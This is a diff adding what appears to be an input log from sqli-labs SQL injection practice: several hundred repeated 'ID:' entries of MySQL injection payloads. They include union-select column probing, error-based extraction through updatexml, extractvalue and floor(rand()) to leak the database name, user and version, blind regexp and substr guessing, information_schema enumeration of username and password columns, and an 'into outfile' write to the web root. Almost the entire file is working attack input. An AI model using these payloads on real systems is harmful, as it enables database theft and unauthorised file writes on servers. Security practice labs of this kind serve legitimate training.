@@ -1,0 +1,429 @@
+ID:0") union select 1,2,3 -- 
+ID:\ ==0") union select 1,2,3 -- 
+ID:\
+ID:1' union select 1,2,3 -- 
+ID:1
+ID:1
+ID:1\
+ID:1' union select 1,2,3 into outfile '/var/www/html/sqli-labs/Less-5/u.txt' -- 
+ID:1
+ID:1\
+ID:1
+ID:1\
+ID:1
+ID:1' and database() regexp '[a-z]*' -- 
+ID:1' and database() regexp '[^a-z]*' -- 
+ID:1' and database() regexp '[^a-z]*' -- 
+ID:1' and database() regexp '[a-z]' -- 
+ID:1' and database() regexp '[a-z]' -- 
+ID:1' and database() regexp '[^a-z]' -- 
+ID:1' and database() regexp '[a-z]' -- 
+ID:1' and database() regexp 'a[a-z]' -- 
+ID:1' and database() regexp 'b[a-z]' -- 
+ID:1' and database() regexp 'c[a-z]' -- 
+ID:1' and database() regexp 'ca[a-z]' -- 
+ID:1' and database() regexp 'cb[a-z]' -- 
+ID:1' and database() regexp 'cc[a-z]' -- 
+ID:1' and database() regexp 'cd[a-z]' -- 
+ID:1' and database() regexp 'ce[a-z]' -- 
+ID:1' and database() regexp 'cf[a-z]' -- 
+ID:1' and database() regexp 'cg[a-z]' -- 
+ID:1' and database() regexp 'cr[a-z]' -- 
+ID:1' and database() regexp 'ch[a-z]' -- 
+ID:1' and database() regexp 'ci[a-z]' -- 
+ID:1' and database() regexp 'cg[a-z]' -- 
+ID:1' and database() regexp 'ck[a-z]' -- 
+ID:1' and database() regexp 'cj[a-z]' -- 
+ID:1' and database() regexp 'cl[a-z]' -- 
+ID:1' and database() regexp 'cm[a-z]' -- 
+ID:1' and database() regexp 'c[x-y][a-z]' -- 
+ID:1' and database() regexp 'c' -- 
+ID:1' and database() regexp 'cr' -- 
+ID:1' and database() regexp 'cs' -- 
+ID:1' and database() regexp 'c' -- 
+ID:1' and database() regexp 'cu' -- 
+ID:1' and database() regexp 'cu[a-z]' -- 
+ID:1' and database() regexp '[a-z]cu[a-z]' -- 
+ID:1' and database() regexp '[^a-z]' -- 
+ID:1' and database() regexp '^[a-z]' -- 
+ID:1' and database() regexp '^c[a-z]' -- 
+ID:1' and database() regexp '^se[a-z]' -- 
+ID:1' and database() regexp '^[a-z]{9}' -- 
+ID:1' and database() regexp '^[a-z]{8}' -- 
+ID:1' and database() regexp '^[a-z]{1,9}' -- 
+ID:-1") union select 1, database(), 3 -- 
+ID:-1 union select 1, database(), 3 -- 
+ID:-1 union select 1, database(), 3 -- 
+ID:-1' union select 1, database(), 3 -- 
+ID:-1' union select 1, database(), 3
+ID:-1' union select 1, database(), 3 -- 
+ID:-1' and updatexml(1, concat(0x7e,database(),0x7e),1) -- 
+ID:-1' and updatexml(1, concat(0x7e,database(),0x7e),1) -- 
+ID:-1' and updatexml(1, concat(0x71,database(),0x71),1) -- 
+ID:-1' and updatexml(1, concat(0x71,database(),0x71),1) -- 
+ID:-1' and updatexml(1, concat(0x71,database(),0x71),1) -- 
+ID:-1' and updatexml(1, concat(0x71,database(),0x71),1) -- 
+ID:-1' and updatexml(1, concat(0x7e,database(),0x7e),1) --
+ID:-1' and updatexml(1, concat(0x7e,database(),0x7e),1) --
+ID:-1' and updatexml(1, concat(0x7e,database(),0x7e),1) --
+ID:-1' and updatexml(1, concat(0x7e,database(),0x7e),1) --
+ID:-1' and updatexml(1, concat(0x7e,database(),0x7e),1) --
+ID:-1' and updatexml(1, concat(0x7e,database(),0x7e),1) --
+ID:-1' and updatexml(1, concat(0x7e,database(),0x7e),1) #
+ID:-1' and updatexml(1, concat(0x7e,database(),0x7e),1) #
+ID:-1' and updatexml(1, concat(0x7e,database(),0x7e),1) #
+ID:-1' and updatexml(1, concat(0x71,database(),0x71),1) #
+ID:-1' and updatexml(1, concat(0x71,database(),0x71),1) #
+ID:-1' and updatexml(1, concat(0x71,database(),0x71),1) #
+ID:-1' and updatexml(2, concat(0x71,database(),0x71),2) #
+ID:-1' and updatexml(2, concat(0x71,database(),0x71),2) #
+ID:-1") union select 1, datebase(), 3 -- 
+ID:-1") union select 1, datebase(), 3 -- 
+ID:-1") union select 1, datebase(), 3 --
+ID:-1") union select 1, datebase(), 3 --
+ID:-1 union select 1, datebase(), 3 --
+ID:-1 union select 1, datebase() --
+ID:-1 union select 1, datebase() --
+ID:-1 union select 1, datebase(), 3 --
+ID:-1 union select 1, datebase(), 3 --
+ID:1 union select 1, datebase(), 3 --
+ID:1 union select 1, datebase(), 3 --
+ID:1 union select 1, datebase(), 3 --
+ID:-1 union select 1, datebase(), 3 --
+ID:-1 union select datebase() --
+ID:-1 union select datebase() --
+ID:-1 union select datebase() --
+ID:-1' union select datebase() --
+ID:-1' union select datebase() --
+ID:-1 union select datebase() --
+ID:-1 union select datebase()
+ID:-1" union select datebase() -- 
+ID:-1" union select datebase() -- 
+ID:-1 union select datebase()
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:0") union select 1,2,3 --
+ID:0") union select 1,2,3 --
+ID:0") union select 1,2,3 --
+ID:0") union select 1,2,3 --
+ID:0") union select 1,2,3 --
+ID:0") union select 1,2,3 --
+ID:=0") union select 1,2,3 --
+ID:=0") union select 1,2,3 --
+ID:=0") union select 1,2,3 --
+ID:=0") union select 1,2,3 --
+ID:-1") union select 1, database(),3 --
+ID:-1") union select 1, database(),3 --
+ID:-1") union select 1, database(),3 --
+ID:-1") union select 1, database(),3 --
+ID:1' and database() regexp '[a-z]*' --
+ID:1' and database() regexp '[a-z]*' --
+ID:1' and database() regexp '[a-z]*' --
+ID:1' and database() regexp '[a-z]*' --
+ID:-1' and substr(database(),1,1)='s'-- 
+ID:-1' and substr(database(),1,1)='s'-- 
+ID:-1' and substr(database(),1,1)='s'-- 
+ID:-1' and substr(database(),2,1)='s'-- 
+ID:-1' and substr(database(),2,1)='s'-- 
+ID:-1' and substr(database(),0,1)='s'-- 
+ID:-1' and substr(database(),0,1)='s'-- 
+ID:-1' and substr(database(),0,1)='s'-- 
+ID:-1' and substr(database(),1,1)='s'-- 
+ID:-1' and substr(database(),1,1)='s'-- 
+ID:1' and substr(database(),1,1)='s'-- 
+ID:1' and substr(database(),1,1)='s'-- 
+ID:1' and substr(database(),2,1)='s'-- 
+ID:1' and substr(database(),2,1)='s'-- 
+ID:-1' and updatexml(2, concat(0x71,database(),0x71),2) #
+ID:1' and updatexml(2, concat(0x71,database(),0x71),2) #
+ID:1' and updatexml(2, concat(0x71,database(),0x71),2) #
+ID:1' and updatexml(2, concat(0x71,database(),0x71),2) #
+ID:1' and updatexml(2, concat(0x71,database(),0x71),2) #
+ID:1' and updatexml(2, concat(0x71,database(),0x71),2) #
+ID:1' and updatexml(2, concat(0x7e,database(),0x7e),2) #
+ID:1' and updatexml(1, concat(0x7e,database(),0x7e),1) #
+ID:1' and updatexml(1, concat(0x7e,database(),0x7e),1) -- 
+ID:1' and updatexml(1, concat(0x7e,database(),0x7e),1) --
+ID:1' and updatexml(1, concat(0x7e,database(),0x7e),1) --
+ID:1' and updatexml(1, concat(0x7e,database(),0x7e),1) --
+ID:1' and updatexml(1, concat(0x7e,database(),0x7e),1) --
+ID:1' and updatexml(1, concat(0x7e,database(),0x7e),1) --
+ID:1' and updatexml(1, concat(0x7e,database(),0x7e),1) --
+ID:1' and updatexml(1, concat(0x7e,database(),0x7e),1) --
+ID:1' and updatexml(1, concat(0x7e,database(),0x7e),1) --
+ID:1' and updatexml(1, concat(0x7e,database(),0x7e),1) --
+ID:1' and updatexml(1, concat(0x7e,database(),0x7e),1) --
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1) -- 
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1) -- 
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1) -- 
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1) -- 
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1) -- 
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1) -- 
+ID:0' and updatexml(1, concat(0x7e, database(), 0x7e), 1) -- 
+ID:-1' and updatexml(1, concat(0x7e, database(), 0x7e), 1) -- 
+ID:-1' and updatexml(1, concat(0x71, database(), 0x71), 1) -- 
+ID:-1' and updatexml(1, concat(0x71, database(), 0x71), 1) -- 
+ID:-1' and updatexml(1, concat(0x71, database(), 0x71), 1) -- 
+ID:-1' and updatexml(1, concat(0x71, database(), 0x71), 1) -- 
+ID:-1' and updatexml(1, concat(0x71, database(), 0x71), 1) -- 
+ID:-1' and updatexml(1, concat(0x71, database(), 0x71), 1) -- 
+ID:-1' and updatexml(1, concat(0x71, database(), 0x71), 1) -- 
+ID:-1' and updatexml(1, concat(0x71, database(), 0x71), 1) -- 
+ID:1' and updatexml(1, concat(0x71, database(), 0x71), 1) -- 
+ID:1' and updatexml(1, concat(0x71, database(), 0x71), 1) -- 
+ID:1' and updatexml(1, concat(0x71, database(), 0x71), 1) -- 
+ID:-1' and updatexml(1, concat(0x71, database(), 0x71), 1) -- 
+ID:-1' and updatexml(1, concat(0x71, database(), 0x71), 1) -- 
+ID:-1' and updatexml(1, concat(0x71, database(), 0x71), 1) -- 
+ID:-1' and updatexml(1, concat(0x71, database(), 0x71), 1) -- 
+ID:-1' and updatexml(1, concat(0x71, database(), 0x71), 1) -- 
+ID:-1' and updatexml(1, concat(0x71, database(), 0x71), 1) -- 
+ID:-1' and updatexml(1, concat(0x71, database(), 0x71), 1) -- 
+ID:-1' and updatexml(1, concat(0x71, database(), 0x71), 1) -- 
+ID:-1' and updatexml(1, concat(0x71, database(), 0x71), 1) -- 
+ID:-1' and updatexml(1, concat(0x71, database(), 0x71), 1) -- 
+ID:-1' and updatexml(1, concat(0x71, database(), 0x71), 1) -- 
+ID:-1' union select 1,2,3 -- 
+ID:1' union select 1,2,3 -- 
+ID:1' union select 1,2,3 -- 
+ID:-1' union select 1,2,3 -- 
+ID:-1' union select 1,2,3 -- 
+ID:-1' union select 1,2,3 -- 
+ID:-1' union select 1, -- 
+ID:-1' union select 1, -- 
+ID:-1' union select 1 -- 
+ID:-1' union select 1,2 -- 
+ID:-1' union select 1,2,3 -- 
+ID:-1' union select 1,2,3,4 -- 
+ID:-1' union select 1,2,3 -- 
+ID:-1' union select 1,2,3 -- 
+ID:-1' union select 1,2,3 -- 
+ID:-1' union select 1,2,3 -- 
+ID:-1' union select 1,2,3 -- 
+ID:-1' union select 1,2,3 -- 
+ID:-1' union select 1,2,3 -- 
+ID:-1' union select 1,2,3 -- 
+ID:1' union select 1,2,3 -- 
+ID:1' union select 1,2,3 -- 
+ID:2' union select 1,2,3 -- 
+ID:2' union select 1,2,3 -- 
+ID:1' union select 1,2,3 -- 
+ID:1' union select 1,2,3 -- 
+ID:1' union select 1,2,3 -- 
+ID:1' union select 1,2,3 -- 
+ID:1' and 1=2 -- 
+ID:1' and 1=2 -- 
+ID:1' and 1=2 -- 
+ID:1' and 1=2 -- 
+ID:-1' and 1=2 -- 
+ID:1' and 1=2 -- 
+ID:1' and 1=1 -- 
+ID:1' and 1=1 -- 
+ID:1' and 1=1 -- 
+ID:1 '
+ID:1 '
+ID:1 ' and 1=1 -- 
+ID:1 ' and 1=1 -- 
+ID:1 ' and 1=1 -- 
+ID:1' and extractvalue(1, concat(0x7e, database(),0x7e)) #'
+ID:1' and extractvalue(1, concat(0x7e, database(),0x7e)) #'
+ID:1' and extractvalue(1, concat(0x7e, database(),0x7e)) #'
+ID:1' and extractvalue(1, concat(0x7e, database(), 0x7e)) #'
+ID:1' and extractvalue(1, concat(0x7e, database(), 0x7e)) -- 
+ID:1' and extractvalue(1, concat(0x7e, database(), 0x7e)) -- 
+ID:1' and extractvalue(1, concat(0x7e, database(), 0x7e)) -- 
+ID:-1' and extractvalue(1, concat(0x7e, database(), 0x7e)) -- 
+ID:-1' and extractvalue(1, concat(0x7e, database(), 0x7e)) -- 
+ID:-1 and extractvalue(1, concat(0x7e, database(), 0x7e)) -- 
+ID:1 and extractvalue(1, concat(0x7e, database(), 0x7e)) -- 
+ID:1 and extractvalue(1, concat(0x7e, database(), 0x7e))
+ID:1 and extractvalue(1, concat(0x7e, database(), 0x7e))
+ID:1 and extractvalue(1, concat(0x7e, database(), 0x7e))
+ID:1 and extractvalue(1, concat(0x7e, database(), 0x7e))
+ID:1 and extractvalue(1, concat(0x7e, database(), 0x7e))
+ID:1 and extractvalue(1, concat(0x7e, database(), 0x7e))
+ID:1 and extractvalue(1, concat(0x7e, database(), 0x7e))
+ID:1 and extractvalue(1, concat(0x7e, database(), 0x7e))
+ID:1 and extractvalue(1, concat(0x7e, database(), 0x7e), 1)
+ID:1 and extractvalue(1, concat(0x7e, database(), 0x7e), 1)
+ID:1 and extractvalue(1, concat(0x7e, database(), 0x7e), 1)
+ID:1 and extractvalue(1, concat(0x7e, database(), 0x7e), 1)
+ID:1 and extractvalue(1, concat(0x7e, database(), 0x7e), 1)
+ID:1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='learn' limit 3,1),0x7e),1)#'
+ID:1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='learn' limit 3,1),0x7e),1)#'
+ID:1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='learn' limit 3,1),0x7e),1)#
+ID:1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='learn' limit 3,1),0x7e),1)#'
+ID:1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='searcty' limit 3,1),0x7e),1)#'
+ID:1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='searcty' limit 3,1),0x7e),1)#'
+ID:1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='searcty' limit 3,1),0x7e),1)#'
+ID:1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='searcty' limit 3,1),0x7e),1)#'
+ID:1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='searcty' limit 3,1),0x7e),1)#'
+ID:1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='searcty' limit 3,1),0x7e),1)#'
+ID:1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='secucity' limit 3,1),0x7e),1)#'
+ID:1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='secucity' limit 3,1),0x7e),1)#'
+ID:1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='secucity' limit 3,1),0x7e),1)#'
+ID:1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='secucity' limit 3,1),0x7e),1)#'
+ID:1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='secucity' limit 3,1),0x7e),1)#'
+ID:1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='secucity' limit 3,1),0x7e),1)#'
+ID:1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='secucity' limit 3,1),0x7e),1)#'
+ID:1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='secucity' limit 3,1),0x7e),1)#'
+ID:1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='secucity' limit 3,1),0x7e),1)#'
+ID:1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 3,1),0x7e),1)#'
+ID:1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 3,1),0x7e),1)#'
+ID:1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 3,1),0x7e),1)#'
+ID:1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 3,1),0x7e),1)#'
+ID:1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 3,1),0x7e),1)#'
+ID:1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 3,1),0x7e),1)#'
+ID:1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 3,1),0x7e),1) -- 
+ID:1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 3,1),0x7e),1) -- 
+ID:1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 3,1),0x7e),1) -- 
+ID:1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 3,1),0x7e),1) -- 
+ID:1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 3,1),0x7e),1) -- 
+ID:1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 3,1),0x7e),1) -- 
+ID:1' and (select substr(database(),1,1)='1')
+ID:1' and (select substr(database(),1,1)='1')
+ID:1' and (select substr(database(),1,1)='1') -- 
+ID:1' and (select substr(database(),1,1)='1') -- 
+ID:1' and (select substr(database(),1,1)='1') -- 
+ID:1' and (select substr(database(),1,1)='1') -- 
+ID:1 and (select substr(database(),1,1)='1') -- 
+ID:1 and (select substr(database(),1,1)='1') -- 
+ID:1 and (select substr(database(),1,1)='1') -- 
+ID:1 and (select substr(database(),1,1)='1') -- 
+ID:1 and (select substr(database(),1,1)='1') -- 
+ID:1 and (select substr(database(),1,1)='1') -- 
+ID:1 and (select substr(database(),1,1)='1') -- 
+ID:1 and (select substr(database(),1,1)='1') -- 
+ID:1 and (select substr(database(),1,1)='1') -- 
+ID:1 and (select substr(database(),1,1)='1') -- 
+ID:1 and (select substr(database(),1,1)='1') -- 
+ID:-1' and (select substr(database(),1,1)='1') -- 
+ID:-1' and (select substr(database(),1,1)='1') -- 
+ID:-1' and (select substr(database(),1,1)='1') -- 
+ID:-1' and (select substr(database(),1,1)='1') -- 
+ID:-1' and (select substr(database(),1,1)='1') -- 
+ID:-1' and (select substr(database(),1,1)='1') -- 
+ID:-1' and (select substr(database(),1,1)='1') -- 
+ID:-1' and (select substr(database(),1,1)='1') -- 
+ID:-1' and (select substr(database(),1,1)='1') -- 
+ID:-1' and (select substr(database(),1,1)='1') -- 
+ID:-1' and (select substr(database(),1,1)='1') -- 
+ID:-1' and (select substr(database(),1,1)='1') -- 
+ID:-1' and (select substr(database(),1,1)='1') -- 
+ID:-1' and (select substr(database(),1,1)='e') -- 
+ID:-1' and (select substr(database(),1,1)='e') -- 
+ID:-1' and (select substr(database(),1,1)='e') -- 
+ID:-1' and (select substr(database(),1,1)='e') -- 
+ID:-1' and (select substr(database(),1,1)='s') -- 
+ID:-1' and (select substr(database(),1,1)='s') -- 
+ID:-1' and (select substr(database(),1,1)='s') -- 
+ID:-1' and (select substr(database(),1,1)='s') -- 
+ID:-1' and (select substr(database(),1,1)='s') -- 
+ID:-1' and (select substr(database(),1,1)='s') -- 
+ID:-1' and (select substr(database(),1,1)='s') -- 
+ID:-1' and (select substr(database(),1,1)='s') -- 
+ID:-1' and (select substr(database(),1,1)='s') -- 
+ID:-1' and (select substr(database(),1,1)='s') -- 
+ID:-1' and (select substr(database(),1,1)='s') -- 
+ID:-1' and (select substr(database(),1,1)='s') -- 
+ID:-1' and (select substr(database(),1,1)='s') -- 
+ID:1' and (select substr(database(),1,1)='s') -- 
+ID:1' and (select substr(database(),1,1)='s') -- 
+ID:1' and (select substr(database(),1,1)='s') -- 
+ID:1' and (select substr(database(),1,1)='s') -- 
+ID:1' and (select substr(database(),1,1)='s') -- 
+ID:1' and (select substr(database(),1,1)='s') -- 
+ID:1' and (select substr(database(),1,1)='s') -- 
+ID:1' and (select substr(database(),1,1)='e') -- 
+ID:1' and (select substr(database(),1,1)='e') -- 
+ID:1' and (select substr(database(),2,1)='e') -- 
+ID:1' and (select substr(database(),3,1)='c') -- 
+ID:1' and (select substr(database(),4,1)='u') -- 
+ID:1' and (select substr(database(),4,1)='r') -- 
+ID:1' and (select substr(database(),5,1)='r') -- 
+ID:1' and (select substr(database(),6,1)='i') -- 
+ID:1' and (select substr(database(),7,1)='t') -- 
+ID:1' and (select substr(database(),8,1)='y') -- 
+ID:1' and (select substr(database(),9,1)='y') -- 
+ID:1' and (select substr(database(),9,1)='y') -- 
+ID:1' and (select substr(database(),1,1)='y') -- 
+ID:1id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^username' limit 0,1)-- 
+ID:1id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^username' limit 0,1)-- 
+ID:1id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^username' limit 0,1)-- 
+ID:1id=1' and 1=(select 1 from information_schema.columns where table_name='user' and column_name regexp '^username' limit 0,1)-- 
+ID:1id=1' and 1=(select 1 from information_schema.columns where table_name='user' and column_name regexp '^username' limit 0,1)-- 
+ID:1id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^username' limit 0,1)-- 
+ID:1id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^usernme' limit 0,1)-- 
+ID:1id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^username' limit 0,1)-- 
+ID:1id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^username' limit 1,1)-- 
+ID:1id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^username' limit 1,1)-- 
+ID:1id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^username' limit 0,1)-- 
+ID:1id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^password' limit 1,1)-- 
+ID:1id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^password' limit 1,1)-- 
+ID:1id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^passwd' limit 1,1)-- 
+ID:1id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^password' limit 1,1)-- 
+ID:1 and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+ID:1 and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+ID:1 and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+ID:1 and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+ID:1' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) -- 
+ID:-1' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) -- 
+ID:-1' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) -- 
+ID:-1' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) -- 
+ID:-1' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) -- 
+ID:-1' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) -- 
+ID:-1' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) -- 
+ID:-1' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) -- 
+ID:-1' and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);-- 
+ID:-1' and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);-- 
+ID:-1' and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);-- 
+ID:-1' and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)-- 
+ID:-1' and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)-- 
+ID:-1' and (extractvalue(1,concat(0x7e,(select user()),0x7e))) -- 
+ID:-1' and (extractvalue(1,concat(0x7e,(select user()),0x7e))) -- 
+ID:-1" and (extractvalue(1,concat(0x7e,(select user()),0x7e))) -- 
+ID:-1" and (extractvalue(1,concat(0x7e,(select user()),0x7e))) -- 
+ID:-1" and (extractvalue(1,concat(0x7e,(select user()),0x7e))) -- 
+ID:-1" and (extractvalue(1,concat(0x7e,(select user()),0x7e))) -- 
+ID:-1" and (extractvalue(1,concat(0x7e,(select user()),0x7e))) -- 
+ID:-1" and (extractvalue(1,concat(0x7e,(select user()),0x7e))) -- 
+ID:-1" and (extractvalue(1,concat(0x7e,(select user()),0x7e))) -- 
+ID:-1" and (extractvalue(1,concat(0x7e,(select user()),0x7e))) -- 
+ID:-1") and (extractvalue(1,concat(0x7e,(select user()),0x7e))) -- 
+ID:-1") and (extractvalue(1,concat(0x7e,(select user()),0x7e))) -- 
+ID:-1') and (extractvalue(1,concat(0x7e,(select user()),0x7e))) -- 
+ID:1" and (extractvalue(1,concat(0x7e,(select user()),0x7e))) -- 
+ID:-1" and (extractvalue(1,concat(0x7e,(select user()),0x7e))) -- 
+ID:-1" and (extractvalue(1,concat(0x7e,(select user()),0x7e))) -- 
+ID:-1" and (extractvalue(1,concat(0x7e,(select user()),0x7e))) -- 
+ID:-1" and (extractvalue(1,concat(0x7e,(select user()),0x7e))) -- 
+ID:1' union select updatexml(1,concat(0x7e,(select user()),0x7e),1) -- 
+ID:1' union select updatexml(1,concat(0x7e,(select user()),0x7e),1) -- 
+ID:1' union select updatexml(1,concat(0x7e,(select user()),0x7e),1) -- 
+ID:1' union select updatexml(1,concat(0x7e,(select user()),0x7e),1) -- -
+ID:1' union select updatexml(1,concat(0x7e,(select user()),0x7e),1) -- -
+ID:1' union select updatexml(1,concat(0x7e,(select user()),0x7e),1) -- -
+ID:1' union select updatexml(1,concat(0x7e,(select user()),0x7e),1) -- -
+ID:-1")  union select 1,database(),3 -- 
+ID:-1'  union select 1,database(),3 -- 
+ID:-1'  union select 1,database(),3 -- 
+ID:-1"  union select 1,database(),3 -- 
+ID:-1"  union select 1,database(),3 -- 
+ID:-1'  union select 1,database(),3 -- 
+ID:-1')  union select 1,database(),3 -- 
+ID:-1'  union select 1,database(),3 -- 
+ID:-1'  union select 1,database(),3 -- 
+ID:-1'  union select 1,database(),3 -- 
+ID:1'  union select 1,database(),3 -- 
+ID:-1'  union select 1,database(),3 -- 
+ID:1'  and updatexml(1,concat(0x7e,database(),0x7e),1) -- 
+ID:1'  and updatexml(1,concat(0x7e,database(),0x7e),1) -- 
+ID:1'  and updatexml(1,concat(0x7e,database(),0x7e),1) -- 
+ID:1'  and updatexml(1,concat(0x7e,database(),0x7e),1) -- 
